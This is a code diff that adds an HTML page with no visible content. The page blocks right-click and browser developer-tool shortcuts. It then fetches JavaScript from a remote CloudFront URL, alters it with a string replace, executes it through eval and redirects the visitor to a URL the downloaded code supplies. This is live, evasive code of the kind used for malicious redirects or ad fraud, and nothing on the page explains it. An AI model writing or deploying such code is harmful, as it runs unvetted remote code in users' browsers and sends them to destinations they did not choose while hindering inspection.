@@ -1,0 +1,70 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<script>
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+    document.onkeydown = function (e) {
+
+        // disable F12 key
+        if(e.keyCode == 123) {
+            return false;
+        }
+
+        // disable I key
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
+            return false;
+        }
+
+        // disable J key
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+            return false;
+        }
+
+        // disable U key
+        if(e.ctrlKey && e.keyCode == 85) {
+            return false;
+        }
+    }
+
+
+
+function isInIframe() {
+        try {
+            return window.self !== window.top;
+        } catch (e) {
+            return true;
+        }
+}
+
+</script>
+
+		
+	  <script>
+
+fetch("https://dcbbwymp1bhlf.cloudfront.net/?wbbcd=1675311")
+   .then(data => data.text())
+   .then((data) => {
+	   
+var x3 = "var b=this;";
+var x4 = "var b=this;abc1 = b.url.toString();"
+var data1 = data.replace(x3, x4); 
+eval(data1);
+//var win = window.open(abc1);
+window.location.href = abc1;
+//document.getElementById('adx1').src = abc1;
+
+   })
+   .catch(err => console.log(err))
+</script>
+
+</div>
+
+
+</body>
+</html>
